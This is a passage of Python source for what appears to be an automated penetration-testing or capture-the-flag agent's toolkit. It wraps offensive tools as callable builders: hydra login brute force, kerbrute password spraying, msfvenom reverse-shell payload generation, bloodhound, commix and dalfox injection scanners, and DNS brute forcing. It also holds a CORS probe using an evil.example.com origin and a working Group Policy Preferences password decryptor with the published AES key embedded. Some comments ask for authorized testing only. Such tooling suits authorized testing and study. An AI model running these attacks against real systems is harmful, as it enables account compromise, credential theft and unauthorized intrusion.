        return (f"could not fetch favicon: {exc}", True)
    h = _mmh3_32(base64.encodebytes(content))
    return (f"favicon: {fav} ({len(content)} bytes)\nmmh3 hash: {h}\n"
            f"pivot: shodan http.favicon.hash:{h}")


def _b_js_endpoints(a):
    url = _req_url(a)
    try:
        body = _http_get(url, timeout=20).read(600000).decode("utf-8", "replace")
    except Exception as exc:                            # noqa: BLE001
        return (f"request failed: {exc}", True)
    pat = re.compile(
        r'''["'`]((?:https?:)?/[A-Za-z0-9_\-./?=&%~]{2,}'''
        r'''|[A-Za-z0-9_\-./]+?\.(?:php|asp|aspx|jsp|json|xml|do|action|api)'''
        r'''[A-Za-z0-9_\-./?=&%~]*)["'`]''')
    hits = sorted({m.group(1) for m in pat.finditer(body)})
    if not hits:
        return "no endpoints/paths found in the response."
    return (f"{len(hits)} endpoints:\n" + "\n".join(hits[:100])
            + (f"\n… (+{len(hits) - 100} more)" if len(hits) > 100 else ""))


def _b_cors_check(a):
    import urllib.error
    url = _req_url(a)
    evil = "https://evil.example.com"
    try:
        hdrs = {k.lower(): v for k, v in _http_get(url, headers={"Origin": evil})
                .getheaders()}
    except urllib.error.HTTPError as exc:
        hdrs = {k.lower(): v for k, v in exc.headers.items()}
    except Exception as exc:                            # noqa: BLE001
        return (f"request failed: {exc}", True)
    acao = hdrs.get("access-control-allow-origin", "")
    acac = hdrs.get("access-control-allow-credentials", "").lower()
    notes = []
    if acao == evil:
        notes.append("⚠ reflects arbitrary Origin (ACAO == our test origin)")
    elif acao == "*":
        notes.append("ACAO: * (wildcard — credentials not allowed)")
    elif acao:
        notes.append(f"ACAO: {acao}")
    else:
        notes.append("no Access-Control-Allow-Origin (no CORS)")
    if acac == "true" and acao == evil:
        notes.append("⚠⚠ Allow-Credentials:true WITH a reflected origin — "
                     "exploitable CORS")
    return f"{url} (Origin: {evil})\n" + "\n".join(notes)


_SUBDOMAINS = ("www mail ftp smtp pop imap webmail ns1 ns2 dns dev test staging api "
               "admin portal vpn remote git gitlab jenkins jira confluence intranet "
               "extranet cloud cdn static assets img images shop store blog forum "
               "support help docs wiki app apps mobile m beta demo secure login auth "
               "sso ldap ad dc backup db mysql sql mssql redis mongo kibana grafana "
               "prometheus monitor status metrics owa autodiscover exchange").split()


def _b_dns_bruteforce(a):
    import concurrent.futures
    import socket
    domain = _word(a, "domain").strip().lstrip(".")
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    words = list(_SUBDOMAINS)
    extra = (a.get("extra") or "").strip()
    if extra:
        words += [w for w in re.split(r"[,\s]+", extra)
                  if re.match(r"^[A-Za-z0-9_-]+$", w)]
    old = socket.getdefaulttimeout()
    socket.setdefaulttimeout(3)
    found = []
    try:
        def _res(sub):
            try:
                return (f"{sub}.{domain}", socket.gethostbyname(f"{sub}.{domain}"))
            except Exception:                          # noqa: BLE001
                return None
        with concurrent.futures.ThreadPoolExecutor(max_workers=40) as ex:
            found = [r for r in ex.map(_res, words) if r]
    finally:
        socket.setdefaulttimeout(old)
    if not found:
        return f"no subdomains from the built-in list resolved for {domain}."
    return (f"{len(found)} subdomains resolved:\n"
            + "\n".join(f"  {h} -> {ip}" for h, ip in found))


# ── batch 7: more CLI tools ───────────────────────────────────────────────────
def _b_bloodhound(a):
    dc = (a.get("dc") or a.get("host") or "").strip()
    if not dc or "/" in dc or not _HOST_RE.match(dc):
        raise ValueError("`dc` (domain controller host/IP) is required")
    domain = (a.get("domain") or "").strip()
    if not domain or not re.match(r"^[A-Za-z0-9._-]+$", domain):
        raise ValueError("`domain` is required (e.g. corp.local)")
    user, password, nthash, _d = _creds(a, require=True)
    coll = a.get("collection") or "DCOnly"
    if coll not in ("Default", "DCOnly", "All", "Group", "Session", "LoggedOn",
                    "Trusts", "ACL", "Container", "ObjectProps"):
        raise ValueError("bad `collection`")
    argv = ["bloodhound-python", "-d", domain, "-u", user, "-dc", dc, "-ns", dc,
            "-c", coll, "--zip"]
    if nthash:
        argv += ["--hashes", _hashes_arg(nthash)]
    else:
        argv += ["-p", password]
    return argv, "bloodhound-python"


def _b_katana(a):
    url = _req_url(a)
    argv = ["katana", "-u", url, "-silent"]
    if a.get("depth") is not None:
        try:
            d = int(a["depth"])
        except (TypeError, ValueError):
            raise ValueError("`depth` must be a number")
        if not 1 <= d <= 5:
            raise ValueError("`depth` must be 1-5")
        argv += ["-d", str(d)]
    if a.get("js_crawl"):
        argv.append("-jc")
    return argv, "katana"


def _b_gau(a):
    domain = _word(a, "domain").strip()
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    argv = ["gau", domain]
    if a.get("subs"):
        argv.append("--subs")
    return argv, "gau"


def _b_arjun(a):
    url = _req_url(a)
    method = (a.get("method") or "GET").upper()
    if method not in ("GET", "POST", "JSON", "XML"):
        raise ValueError("`method` must be GET/POST/JSON/XML")
    return ["arjun", "-u", url, "-m", method, "--stable"], "arjun"


def _b_dalfox(a):
    url = _req_url(a)
    argv = ["dalfox", "url", url, "--no-color"]
    data = (a.get("data") or "").strip()
    if data:
        argv += ["--data", _no_ctrl(data, "data")]
    cookie = (a.get("cookie") or "").strip()
    if cookie:
        argv += ["--cookie", _no_ctrl(cookie, "cookie")]
    return argv, "dalfox"


def _b_commix(a):
    url = _req_url(a)
    argv = ["commix", "-u", url, "--batch"]
    data = (a.get("data") or "").strip()
    if data:
        argv += ["--data", _no_ctrl(data, "data")]
    cookie = (a.get("cookie") or "").strip()
    if cookie:
        argv += ["--cookie", _no_ctrl(cookie, "cookie")]
    return argv, "commix"


def _b_dnsrecon(a):
    domain = _word(a, "domain").strip()
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    typ = (a.get("type") or "std").lower()
    if typ not in ("std", "axfr", "srv", "soa", "rvl", "zonewalk", "tld"):
        raise ValueError("`type` must be std/axfr/srv/soa/rvl/zonewalk/tld")
    return ["dnsrecon", "-d", domain, "-t", typ], "dnsrecon"


def _b_nbtscan(a):
    return ["nbtscan", "-v", _req_host(a)], "nbtscan"


def _b_theharvester(a):
    domain = _word(a, "domain").strip()
    if not _HOST_RE.match(domain):
        raise ValueError("`domain` has invalid characters")
    source = (a.get("source") or "duckduckgo").strip().lower()
    if not re.match(r"^[a-z0-9,_-]+$", source):
        raise ValueError("`source` has invalid characters")
    return ["theHarvester", "-d", domain, "-b", source, "-l", "200"], "theHarvester"


_MSF_FORMATS = {"hex", "base64", "python", "bash", "c", "csharp", "powershell",
                "perl", "ruby", "vbscript", "vbapplication", "java", "js_le",
                "js_be", "dw", "dword", "num"}


def _b_msfvenom(a):
    payload = _word(a, "payload").strip()
    if not re.match(r"^[a-z0-9/_]+$", payload):
        raise ValueError("`payload` has invalid characters")
    lhost = (a.get("lhost") or "").strip()
    if not _HOST_RE.match(lhost):
        raise ValueError("`lhost` must be an IP/host")
    try:
        lport = int(a.get("lport"))
    except (TypeError, ValueError):
        raise ValueError("`lport` is required")
    if not 1 <= lport <= 65535:
        raise ValueError("`lport` must be 1-65535")
    fmt = (a.get("format") or "python").lower()
    if fmt not in _MSF_FORMATS:
        raise ValueError("`format` must be a text format: "
                         + ", ".join(sorted(_MSF_FORMATS)))
    return (["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}",
             "-f", fmt], "msfvenom")


# ── batch 8: credential attacks + service gaps ────────────────────────────────
# Small preset wordlists so a brute/spray stays bounded (won't hit the call cap or
# lock out accounts). rockyou is opt-in only. Each maps to the first path present.
_USER_WORDLISTS = {
    "common": ["/usr/share/seclists/Usernames/top-usernames-shortlist.txt"],
    "names":  ["/usr/share/seclists/Usernames/Names/names.txt"],
}
_PASS_WORDLISTS = {
    "common": ["/usr/share/seclists/Passwords/Common-Credentials/"
               "top-passwords-shortlist.txt",
               "/usr/share/wordlists/fasttrack.txt"],
    "worst":  ["/usr/share/seclists/Passwords/Common-Credentials/"
               "500-worst-passwords.txt"],
    "rockyou": ["/usr/share/wordlists/rockyou.txt"],   # large — explicit opt-in
}


def _resolve_preset(table, name, kind):
    paths = table.get(name)
    if paths is None:
        raise ValueError(f"`{kind}` must be one of: " + ", ".join(sorted(table)))
    for p in paths:
        if os.path.exists(p):
            return p
    raise ValueError(f"the '{name}' {kind} wordlist is not installed "
                     f"(looked in {paths[0]}); install seclists/wordlists.")


_HYDRA_SERVICES = {"ssh", "ftp", "smb", "rdp", "mysql", "postgres", "mssql", "vnc",
                   "telnet", "http-get", "https-get", "http-post-form",
                   "https-post-form"}


def _b_login_bruteforce(a):
    """hydra — a bounded online password attack against ONE service on ONE host.
    Authorized testing only; keep lists small to avoid account lockout."""
    host = _req_host(a)
    port = _port(a)
    service = (a.get("service") or "").strip().lower()
    if service not in _HYDRA_SERVICES:
        raise ValueError("`service` must be one of: " + ", ".join(sorted(_HYDRA_SERVICES)))
    username = (a.get("username") or "").strip()
    password = str(a.get("password") if a.get("password") is not None else "")
    userlist = (a.get("userlist") or "").strip()
    passlist = (a.get("passlist") or "").strip()
    if username and not re.match(r"^[^\s:]+$", username):
        raise ValueError("`username` has invalid characters")
    _no_ctrl(password, "password")
    if not (username or userlist):
        raise ValueError("provide `username` or `userlist`")
    if not (password or passlist):
        raise ValueError("provide `password` or `passlist`")
    try:
        threads = int(a.get("threads", 4))
    except (TypeError, ValueError):
        raise ValueError("`threads` must be a number")
    if not 1 <= threads <= 16:
        raise ValueError("`threads` must be 1-16 (small = safer, avoids lockout)")

    argv = ["hydra"]
    argv += (["-l", username] if username
             else ["-L", _resolve_preset(_USER_WORDLISTS, userlist, "userlist")])
    argv += (["-p", password] if password
             else ["-P", _resolve_preset(_PASS_WORDLISTS, passlist, "passlist")])
    argv += ["-t", str(threads), "-f", "-I"]           # -f stop on first, -I no restore
    if port:
        argv += ["-s", str(port)]
    argv += [host, service]
    if service in ("http-post-form", "https-post-form"):
        form = (a.get("form") or "").strip()
        if not form:
            raise ValueError("`form` is required for http-post-form, e.g. "
                             "/login:user=^USER^&pass=^PASS^:F=incorrect")
        _no_ctrl(form, "form")
        argv.append(form)
    elif service in ("http-get", "https-get"):
        path = (a.get("path") or "/").strip()
        _no_ctrl(path, "path")
        argv.append(path)
    return argv, "hydra"


_KERBRUTE_MODES = {"userenum", "passwordspray", "bruteuser"}


def _b_kerbrute(a):
    """kerbrute — Kerberos pre-auth user enumeration / password spray against a DC."""
    mode = (a.get("mode") or "userenum").strip().lower()
    if mode not in _KERBRUTE_MODES:
        raise ValueError("`mode` must be userenum/passwordspray/bruteuser")
    domain = (a.get("domain") or "").strip()
    if not re.match(r"^[A-Za-z0-9._-]+$", domain):
        raise ValueError("`domain` is required (e.g. corp.local)")
    dc = _req_host({"host": a.get("dc")})              # validate the DC like a host
    argv = ["kerbrute", mode, "-d", domain, "--dc", dc]
    if mode == "bruteuser":
        username = (a.get("username") or "").strip()
        if not re.match(r"^[^\s:]+$", username or ""):
            raise ValueError("`username` is required for bruteuser")
        passlist = _resolve_preset(_PASS_WORDLISTS, (a.get("passlist") or "").strip()
                                   or "common", "passlist")
        argv += [passlist, username]
    else:
        userlist = _resolve_preset(_USER_WORDLISTS, (a.get("userlist") or "").strip()
                                   or "common", "userlist")
        argv.append(userlist)
        if mode == "passwordspray":
            password = str(a.get("password") if a.get("password") is not None else "")
            if not password:
                raise ValueError("`password` is required for passwordspray")
            _no_ctrl(password, "password")
            argv.append(password)
    return argv, "kerbrute"


def _b_nfs_enum(a):
    """showmount — list a host's NFS exports (who can mount what)."""
    host = _req_host(a)
    mode = (a.get("mode") or "exports").strip().lower()
    flag = {"exports": "-e", "all": "-a", "dirs": "-d"}.get(mode)
    if flag is None:
        raise ValueError("`mode` must be exports/all/dirs")
    return ["showmount", flag, host], "showmount"


def _b_rsync_enum(a):
    """rsync — list anonymous rsync modules, or the contents of one module."""
    host = _req_host(a)
    port = _port(a, 873)
    module = (a.get("module") or "").strip()
    if module and not re.match(r"^[A-Za-z0-9._-]+$", module):
        raise ValueError("`module` has invalid characters")
    target = f"rsync://{host}:{port}/{module}" + ("/" if module else "")
    return ["rsync", "--list-only", "--contimeout=10", target], "rsync"


def _b_memcached_stats(a):
    """memcached — read version/stats/items/slabs over the text protocol (no auth)."""
    import socket
    host = _req_host(a)
    port = _port(a, 11211)
    out = []
    try:
        s = socket.create_connection((host, port), timeout=8)
        s.settimeout(8)
        for cmd in (b"version\r\n", b"stats\r\n", b"stats items\r\n", b"stats slabs\r\n"):
            try:
                s.sendall(cmd)
                data = b""
                while len(data) < 16000:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                    if data.endswith(b"END\r\n") or b"ERROR" in data \
                            or (cmd == b"version\r\n" and b"\r\n" in data):
                        break
                out.append(f"== {cmd.decode().strip()} ==\n"
                           + data.decode("utf-8", "replace").strip())
            except Exception:                          # noqa: BLE001
                break
        s.close()
    except Exception as exc:                            # noqa: BLE001
        return (f"connection to {host}:{port} failed: {exc}", True)
    return "\n\n".join(out) or "(no data)"


# The AES-256 key Microsoft published for GPP cpassword — makes them reversible.
_GPP_KEY = bytes.fromhex(
    "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b")


def _b_gpp_decrypt(a):
    """Decrypt a Group Policy Preferences cpassword (SYSVOL Groups.xml etc.)."""
    import base64
    cpw = _word(a, "cpassword").strip().replace(" ", "")
    pad = len(cpw) % 4
    if pad:
        cpw += "=" * (4 - pad)
    try:
        blob = base64.b64decode(cpw)
    except Exception as exc:                            # noqa: BLE001
        return (f"invalid base64 cpassword: {exc}", True)
    try:
        from Crypto.Cipher import AES                    # pycryptodome
        dec = AES.new(_GPP_KEY, AES.MODE_CBC, b"\x00" * 16).decrypt(blob)
    except Exception:                                   # noqa: BLE001
        try:
            from cryptography.hazmat.primitives.ciphers import (
                Cipher, algorithms, modes)
            d = Cipher(algorithms.AES(_GPP_KEY), modes.CBC(b"\x00" * 16)).decryptor()
            dec = d.update(blob) + d.finalize()
        except Exception:                              # noqa: BLE001
            return ("no AES library — install pycryptodome or cryptography.", True)
    if dec and dec[-1] <= 16:                            # strip PKCS7 padding
        dec = dec[:-dec[-1]]
    try:
        pw = dec.decode("utf-16-le")
    except Exception:                                   # noqa: BLE001
        pw = dec.decode("utf-8", "replace")
    return f"decrypted GPP password: {pw}"

__all__ = ['MAX_OUTPUT', '_HOST_RE', '_PORTS_RE', '_ANSI_RE', '_req_host', '_port', '_ports', '_word', '_is_root', '_URL_RE', '_req_url', '_no_ctrl', '_WORDLISTS', '_resolve_wordlist', '_DNS_WORDLISTS', '_resolve_dns_wordlist', '_creds', '_hashes_arg', '_impacket_target', '_nxc_auth', '_run', '_NSE_DENY', '_nmap_tuning', '_RANGE_PORTS', '_b_port_discovery', '_b_service_discovery', '_b_script_scan', '_b_http_headers', '_b_ftp_anon', '_b_smb_enum', '_b_snmp_walk', '_b_dns', '_b_ssl_cert', '_b_banner', '_b_searchsploit', '_b_whois', '_b_http_request', '_b_web_content', '_b_whatweb', '_b_nikto', '_b_nuclei', '_b_smb_client', '_NXC_ACTIONS', '_b_nxc_smb', '_b_ldap_search', '_b_rpc_enum', '_b_secretsdump', '_IMPACKET_EXEC', '_b_impacket_exec', '_b_kerberos_roast', '_db_ident', '_b_mysql_query', '_b_mssql_query', '_b_psql_query', '_REDIS_DENY', '_b_redis_cli', '_b_mongo_query', '_b_ssh_exec', '_b_winrm_exec', '_b_ftp_transfer', '_b_subdomain_enum', '_b_dns_zone_transfer', '_b_traceroute', '_b_vhost_fuzz', '_ROOT', '_b_hash_identify', '_b_jwt_decode', '_b_data_transform', '_b_cidr_expand', '_b_ip_info', '_SHELL_TEMPLATES', '_b_payload_gen', '_DEFAULT_CREDS', '_b_default_creds', '_ver_key', '_b_cve_lookup', '_b_tls_analyze', '_b_robots_sitemap', '_b_sqlmap', '_b_wpscan', '_b_enum4linux', '_b_smbmap', '_b_certipy', '_b_testssl', '_b_ssh_audit', '_b_smtp_user_enum', '_b_wafw00f', '_http_get', '_b_git_dump', '_b_s3_check', '_SEC_HEADERS', '_b_security_headers', '_b_cookie_analyze', '_mmh3_32', '_b_favicon_hash', '_b_js_endpoints', '_b_cors_check', '_SUBDOMAINS', '_b_dns_bruteforce', '_b_bloodhound', '_b_katana', '_b_gau', '_b_arjun', '_b_dalfox', '_b_commix', '_b_dnsrecon', '_b_nbtscan', '_b_theharvester', '_MSF_FORMATS', '_b_msfvenom', '_USER_WORDLISTS', '_PASS_WORDLISTS', '_resolve_preset', '_HYDRA_SERVICES', '_b_login_bruteforce', '_KERBRUTE_MODES', '_b_kerbrute', '_b_nfs_enum', '_b_rsync_enum', '_b_memcached_stats', '_GPP_KEY', '_b_gpp_decrypt', '_b_read_file', '_b_flag_hunt', '_b_linux_privesc_enum', '_b_windows_privesc_enum', '_b_gtfobins_lookup']

